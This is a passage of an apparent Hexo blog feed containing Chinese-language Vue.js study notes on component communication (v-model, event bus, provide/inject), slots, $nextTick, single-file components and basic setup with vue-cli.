class="line"><span class="javascript">            <span class="keyword">this</span>.counter++;</span></div><div class="line"><span class="javascript">            <span class="keyword">this</span>.$emit(<span class="string">'input'</span>,<span class="keyword">this</span>.counter);</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;</span></div><div class="line"><span class="javascript"><span class="comment">//new Vue父组件内</span></span></div><div class="line"><span class="undefined">    data: &#123;</span></div><div class="line"><span class="undefined">        total： 0</span></div><div class="line"><span class="undefined">    &#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>　　此处<code>$emit</code>使用<code>input</code>作为特殊事件名，而父组件并没有使用<code>@input=&quot;hander&quot;</code>监听，也没有对应的method中有hander这个函数来更新参数total。<br>　　<code>v-model:total</code> 可以说就是一种语法糖。他就是相当于完成了以上的操作，自定义事件input接受子组件的请求，并且完成对应total的数据更新。一个组件上的<code>v-model</code>默认会利用名为<code>value</code>的prop和名为<code>input</code>的事件</p>
<h4 id="v-model-双向数据绑定"><a href="#v-model-双向数据绑定" class="headerlink" title="v-model 双向数据绑定"></a>v-model 双向数据绑定</h4><p>其实现的功能就跟 在父组件内部中使用v-model 一样，会同步数据。需要满足两个要求：</p>
<ul>
<li>子函数 props 接受一个value属性</li>
<li>有新的value时触发input事件</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>总数：&#123;&#123;total&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">my-component</span> <span class="attr">v-model</span>=<span class="string">"total"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleReduce"</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 父组件更新，同步到子组件 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    Vue.component(<span class="string">'my-component'</span>,&#123;</span></div><div class="line"><span class="javascript">        <span class="comment">//父组件的变化会同步到子组件</span></span></div><div class="line"><span class="javascript">        props: [<span class="string">'value'</span>],</span></div><div class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">input</span> <span class="attr">:value:</span>"<span class="attr">value</span>" @<span class="attr">input</span>=<span class="string">"updateValue"</span>&gt;</span>',</span></div><div class="line"><span class="undefined">        methods: &#123;</span></div><div class="line"><span class="javascript">            <span class="comment">//子组件内函数动态更新，每一次更新都触发emit，到父组件</span></span></div><div class="line"><span class="javascript">            updateValue: <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span></div><div class="line"><span class="javascript">                <span class="keyword">this</span>.$emit(<span class="string">'input'</span>,event.target.value)</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">        el: <span class="string">'#app'</span>,</span></div><div class="line"><span class="undefined">        data: &#123;</span></div><div class="line"><span class="undefined">            total: 0 </span></div><div class="line"><span class="undefined">        &#125;,</span></div><div class="line"><span class="undefined">        methods: &#123;</span></div><div class="line"><span class="javascript">            handleReduce: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="javascript">                <span class="keyword">this</span>.total--;</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="非父子组件通讯"><a href="#非父子组件通讯" class="headerlink" title="非父子组件通讯"></a>非父子组件通讯</h2><h3 id="BUS数据总线"><a href="#BUS数据总线" class="headerlink" title="BUS数据总线"></a>BUS数据总线</h3><p>利用中间vue，形成bus数据总线，一者往里扔数据，一直从里面取数据，使用如下。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line">    &#123;&#123; message &#125;&#125;</div><div class="line">    <span class="tag">&lt;<span class="name">component-a</span>&gt;</span><span class="tag">&lt;/<span class="name">component-a</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> bus = <span class="keyword">new</span> Vue();</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript">    Vue.component(<span class="string">'component-a'</span>, &#123;</span></div><div class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleEvent"</span>&gt;</span>传递事件<span class="tag">&lt;/<span class="name">button</span>&gt;</span>',</span></div><div class="line"><span class="undefined">        methods: &#123;</span></div><div class="line"><span class="javascript">            handleEvent: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="javascript">                <span class="comment">//通过bus把事件on-message</span></span></div><div class="line"><span class="javascript">                bus.$emit(<span class="string">'on-message'</span>,<span class="string">'来自组件component-a的内容'</span>)</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript">    vat app = <span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">        el: <span class="string">'#app'</span>,</span></div><div class="line"><span class="undefined">        data: &#123;</span></div><div class="line"><span class="javascript">            message: <span class="string">''</span></span></div><div class="line"><span class="undefined">        &#125;,</span></div><div class="line"><span class="javascript">        mounted: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></div><div class="line"><span class="javascript">            <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span></div><div class="line"><span class="javascript">            <span class="comment">//在实例初始化时，监听来自bus实例的事件</span></span></div><div class="line"><span class="javascript">            bus.$on(<span class="string">'on-message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">msg</span>)</span>&#123;</span></div><div class="line"><span class="undefined">                _this.message = msg;</span></div><div class="line"><span class="undefined">            &#125;)</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>　　BUS可以实现任何组件间的通讯，包括父子，兄弟，跨级。还可以添加data、methods、computed等选项，这都都是公用的。</p>
<h3 id="父链-子链-根"><a href="#父链-子链-根" class="headerlink" title="父链 子链 根"></a>父链 子链 根</h3><p>在子组件中，使用<code>this.$parent</code>可以直接访问该组件的父实例和组件<br>在父组件中，使用<code>this.$children</code>可以访问他的所有的子组件<br>在子组件中，使用<code>this.$root</code>可以用访问他的根实例</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//this.$parent</span></div><div class="line">methods:&#123;</div><div class="line">    handleEvent: <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="comment">//访问到父链后，可以做任何操作，比如直接修改数据,但是不推荐这样操作，耦合性太高</span></div><div class="line">        <span class="keyword">this</span>.$parent.message = <span class="string">'来自组件component-a的内容'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//this.$root</span></div><div class="line"><span class="comment">// 获取根组件的数据</span></div><div class="line"><span class="keyword">this</span>.$root.foo</div><div class="line"></div><div class="line"><span class="comment">// 写入根组件的数据</span></div><div class="line"><span class="keyword">this</span>.$root.foo = <span class="number">2</span></div><div class="line"></div><div class="line"><span class="comment">// 访问根组件的计算属性</span></div><div class="line"><span class="keyword">this</span>.$root.bar</div><div class="line"></div><div class="line"><span class="comment">// 调用根组件的方法</span></div><div class="line"><span class="keyword">this</span>.$root.baz()</div></pre></td></tr></table></figure>
<h4 id="子组件索引"><a href="#子组件索引" class="headerlink" title="子组件索引"></a>子组件索引</h4><p>在使用<code>$children</code>会返回全部子组件,另外Vue提供了子组件索引的方法来定位组件 ———— <strong>ref</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//为子组件设定索引名称</span></div><div class="line">&lt;component-a ref=<span class="string">"comA"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">component-a</span>&gt;</span></span></div><div class="line"><span class="xml">...</span></div><div class="line"><span class="xml">methods: &#123;</span></div><div class="line"><span class="xml">    handleRef: function() &#123;</span></div><div class="line"><span class="xml">        //定位子组件</span></div><div class="line"><span class="xml">        var msg = this.$refs.comA.message;</span></div><div class="line"><span class="xml">        concole.log(msg);</span></div><div class="line"><span class="xml">    &#125;</span></div><div class="line"><span class="xml">&#125;</span></div></pre></td></tr></table></figure></p>
<h3 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h3><p>　　可以把依赖注入看作一部分“大范围有效的 prop”，除了：</p>
<ul>
<li>祖先组件不需要知道哪些后代组件使用它提供的属性</li>
<li>后代组件不需要知道被注入的属性来自哪里</li>
</ul>
<p>　　<code>provide</code>选项允许我们指定我们想要提供给后代组件的数据/方法。<br>　　<code>在任何后代组件里，我们都可以使用</code>inject`选项来接收指定的我们想要添加在这个实例上的属性</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//父组件</span></div><div class="line">provide: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> &#123;</div><div class="line">    getMap: <span class="keyword">this</span>.getMap</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//后代组件</span></div><div class="line">inject: [<span class="string">'getMap'</span>]</div></pre></td></tr></table></figure>
<h2 id="slot（插槽）"><a href="#slot（插槽）" class="headerlink" title="slot（插槽）"></a>slot（插槽）</h2><p>　　<strong>slot</strong>————内容分发，父组件向子组件分发HTML内容</p>
<ul>
<li>父组件需要分发的内容卸载子组件标签内</li>
<li>子组件模板(template)中使用<code>&lt;slot&gt;</code>标签</li>
<li>当父组件没有插入内容时，<code>&lt;slot&gt;</code>标签中的内容默认出现</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">component-child</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>分发的内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>再来一个<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">component-child</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> bus = <span class="keyword">new</span> Vue();</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript">    Vue.component(<span class="string">'component-child'</span>, &#123;</span></div><div class="line"><span class="undefined">        template: '\</span></div><div class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>\</span></div><div class="line"><span class="xml">            <span class="tag">&lt;<span class="name">slot</span>&gt;</span>\</span></div><div class="line"><span class="xml">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>如果父组件没有插入内容，我将作为默认出现<span class="tag">&lt;<span class="name">p</span>&gt;</span>\</span></div><div class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">slot</span>&gt;</span>\</span></div><div class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span>\</span></div><div class="line"><span class="undefined">        '</span></div><div class="line"><span class="undefined">    &#125;);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript">    vat app = <span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">        el: <span class="string">'#app'</span></span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="具名-slot"><a href="#具名-slot" class="headerlink" title="具名 slot"></a>具名 slot</h3><p>　　具有name属性的slot，可以为slot识别分类插入至子组件模板的不同地方</p>
<ul>
<li>父组件中用<code>slot=&quot;Name&quot;</code>作为标签的属性</li>
<li>子组件中<code>&lt;slot name=&quot;Name&quot;&gt;</code>作为对应插槽位置</li>
<li>具有name属性的slot，可以与普通slot混合使用</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">component-child</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">slot</span>=<span class="string">"header"</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>分发的内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>再来一个<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">component-child</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> bus = <span class="keyword">new</span> Vue();</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript">    Vue.component(<span class="string">'component-child'</span>, &#123;</span></div><div class="line"><span class="undefined">        template: '\</span></div><div class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>\</span></div><div class="line"><span class="javascript">            &lt;slot name=<span class="string">"header"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span>\</span></div><div class="line"><span class="xml">            <span class="tag">&lt;<span class="name">slot</span>&gt;</span>\</span></div><div class="line"><span class="xml">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>如果父组件没有插入内容，我将作为默认出现<span class="tag">&lt;<span class="name">p</span>&gt;</span>\</span></div><div class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">slot</span>&gt;</span>\</span></div><div class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span>\</span></div><div class="line"><span class="undefined">        '</span></div><div class="line"><span class="undefined">    &#125;);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript">    vat app = <span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">        el: <span class="string">'#app'</span></span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="nextTick"><a href="#nextTick" class="headerlink" title="$nextTick"></a>$nextTick</h3><p>　　解决异步更新队列产生的不同步问题</p>
<p>　　Vue在观察到数据变化时并不是直接更新DOM，而是开启一个队列，并缓冲在同一时间循环中发生的所有数据改变。在缓冲时会取出重复数据，从而避免不必要的计算和DOM操作。然后在下一个时间循环tick中，Vue刷新队列并执行实际（已去重的）工作。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//更改DOM</span></div><div class="line"><span class="keyword">this</span>.$nextTick(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="comment">//读取新更新的DOM，需要使用$nextTick</span></div><div class="line">    <span class="keyword">var</span> text = <span class="built_in">document</span>.getElementById(<span class="string">'div'</span>).innerHTML;</div><div class="line">    <span class="built_in">console</span>.log(text);</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<h3 id="在动态组件上使用-keep-alive"><a href="#在动态组件上使用-keep-alive" class="headerlink" title="在动态组件上使用 keep-alive"></a>在动态组件上使用 keep-alive</h3><p>　　动态组件是用<code>is</code>特性来切换不同组件：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">component</span> <span class="attr">v-bind:is</span>=<span class="string">"currentTabComponent"</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>　　这种情况下每次切换组件都会创建一个新的<code>currentTabComponent</code>实例。不会记录实例状态，解决这个问题，比如保存页面状态，可以用<code>&lt;keep-alive&gt;</code>元素将动态组件包裹起来</p>
<hr>

<h1 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h1><p>　　通常使用 <code>Vue.component</code> 来定义全局组件，紧接着用 <code>new Vue({ el: &#39;#container &#39;})</code> 在每个页面内指定一个容器元素。这种方式有很多缺点：</p>
<ul>
<li>全局定义 (Global definitions) 强制要求每个 component 中的命名不得重复</li>
<li>字符串模板 (String templates) 缺乏语法高亮，在 HTML 有多行的时候，需要用到丑陋的 </li>
<li>不支持 CSS (No CSS support) 意味着当 HTML 和 JavaScript 组件化时，CSS 明显被遗漏</li>
<li>没有构建步骤 (No build step) 限制只能使用 HTML 和 ES5 JavaScript, 而不能使用预处理器，如 Pug (formerly Jade) 和 Babel</li>
</ul>
<p>　　文件扩展名为<code>.vue</code>的<code>single-file components</code>(单文件组件) 为以上所有问题提供了解决方法，并且还可以使用 webpack 或 Browserify 等构建工具。</p>
<p><code>.vue</code>文件格式如下:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;greeting&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="built_in">module</span>.exports = &#123;</span></div><div class="line"><span class="javascript">    data: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></div><div class="line"><span class="javascript">        <span class="keyword">return</span>&#123;</span></div><div class="line"><span class="javascript">            greeting: <span class="string">'hello'</span></span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">p &#123;</span></div><div class="line"><span class="undefined">    font-size: 2em;</span></div><div class="line"><span class="undefined">    text-align: center;</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> Vue </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Vue-基础]]></title>
      <url>/2018/07/11/Vue/</url>
      <content type="html"><![CDATA[<p>— 点点开发技能树  —<br>— Vue环境 及 语法 —<br><a id="more"></a></p>
<h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><p>Vue是一种前端JS框架，这里根据<strong>《Vue.js实战》</strong> 以及 <a href="https://cn.vuejs.org/v2/guide/" target="_blank" rel="external">官网教程</a> 记录了下学习笔记，方便以后回忆。</p>
<h1 id="Vue开发环境"><a href="#Vue开发环境" class="headerlink" title="Vue开发环境"></a>Vue开发环境</h1><p>通常有两种方式使用Vue——作为js包进入，直接使用；当做使用npm安装框架，然后模块开发。</p>
<h2 id="网页快速开发"><a href="#网页快速开发" class="headerlink" title="网页快速开发"></a>网页快速开发</h2><ul>
<li>引入vue.js<ul>
<li>开发版本(有错误调试信息)<code>vue.js</code>：<code>&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.js&quot;&gt;&lt;/script&gt;</code></li>
<li>生产版本<code>vue.min.js</code>：<code>&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js&quot;&gt;&lt;/script&gt;</code></li>
</ul>
</li>
<li>编写vue</li>
</ul>
<h2 id="框架开发-Vue-cli"><a href="#框架开发-Vue-cli" class="headerlink" title="框架开发 Vue-cli"></a>框架开发 Vue-cli</h2><p><code>npm i vue-cli -g</code>:全局安装vue-cli<br><code>vue init webpack</code>:使用webpack作为模板(simple是功能简化)</p>
<p><code>npm run dev</code>:开发环境下加载项目，包括以下步骤</p>
<ul>
<li><strong>加载环境变量</strong>：加载config下index.js和dev.env.js</li>
<li><strong>合并webpack配置</strong>：合并<code>webpack.base.conf.js</code>、<code>webpack.dev.conf.js</code>、<code>webpack.prod.con.js</code></li>
<li><strong>配置热加载</strong>：修改的代码可以实时应用</li>
<li><strong>配置代理服务器</strong>：为增加模拟服务端做准备</li>
<li><strong>配置静态资源</strong>：配置静态文件到static虚目录中</li>
<li><strong>加载开发服务器</strong>：启动一个Express的WEB服务器</li>
</ul>
<p><code>npm run build</code>:编译生产环境</p>
<blockquote>
<p>具体利用webpack作为模板，Vue框架开发，在另一篇中具体说明</p>
</blockquote>
<hr>

<h1 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h1><p><strong>选项</strong>相当于Vue的小组件，构成Vue的功能，对象，数据，生命周期，通讯，监听等等。</p>
<h2 id="Vue常用选项"><a href="#Vue常用选项" class="headerlink" title="Vue常用选项"></a>Vue常用选项</h2><p>Vue结构和常用选项如下。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</div><div class="line">    el: <span class="string">''</span>,    <span class="comment">//挂载DOM对象</span></div><div class="line">    data: &#123;    <span class="comment">//数据</span></div><div class="line"></div><div class="line">    &#125;,</div><div class="line">    methods: &#123;  <span class="comment">//事件处理器</span></div><div class="line"></div><div class="line">    &#125;,</div><div class="line">    computed: &#123;  <span class="comment">//计算属性</span></div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    components: &#123; <span class="comment">//注册局部组件</span></div><div class="line"></div><div class="line">    &#125;</div><div class="line">    filters: &#123;  <span class="comment">//过滤器</span></div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<blockquote>
<p>所有的选项都不要使用<code>() =&gt;</code>的形式来定义函数，这是因为箭头函数绑定了父上下文，因此 this 与你期待的 Vue 实例不同。（不懂，但是都是用function()吧）</p>
</blockquote>
<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="el-挂载点"><a href="#el-挂载点" class="headerlink" title="el 挂载点"></a>el 挂载点</h3><p>　　提供一个在页面上已存在的 DOM 元素作为 Vue 实例的挂载目标。可以是 CSS 选择器，也可以是一个 HTMLElement 实例。</p>
<h3 id="template"><a href="#template" class="headerlink" title="template"></a>template</h3><p>　　通常在模块中使用。提供一个在页面上已存在的 DOM 元素作为 Vue 实例的挂载目标。可以是 CSS 选择器，也可以是一个 HTMLElement 实例。</p>
<p>　　在模块中说明</p>
<h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><p>　　字符串模板的代替方案，允许你发挥 JavaScript 最大的编程能力。该渲染函数接收一个 createElement 方法作为第一个参数用来创建 VNode。</p>
<p>　　使用方法很高端，没用过，不详细说明</p>
<h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><p>Vue中的数据形式分为：数据<code>data</code>，计算属性<code>computed</code>。另外说明数据输出到html的方式</p>
<h3 id="data-数据"><a href="#data-数据" class="headerlink" title="data 数据"></a>data 数据</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//new Vue 中可以返回对象</span></div><div class="line">data :&#123;  <span class="comment">//数据</span></div><div class="line">        firstName : <span class="string">'jack'</span>,</div><div class="line">        lastName : <span class="string">'Green'</span></div><div class="line">    &#125;,</div><div class="line"><span class="comment">//Vue组件中 只可以返回函数</span></div><div class="line">data :<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> &#123;</div><div class="line">        firstName : <span class="string">'jack'</span>,</div><div class="line">        lastName : <span class="string">'Green'</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="computed-计算属性"><a href="#computed-计算属性" class="headerlink" title="computed 计算属性"></a>computed 计算属性</h3><p>　　<strong>计算属性</strong> 就是多个数据经过各种复杂的计算，最终返回一个结果<br>　　每一个计算属性都包含一个<code>getter</code>和一个<code>setter</code>,默认是只有<code>getter</code></p>
<ul>
<li>当用到的数据有一个发生变化，计算属性的<code>getter</code>就会重新执行</li>
<li>当计算属性的结果更新是，<code>setter</code>就会执行</li>
</ul>
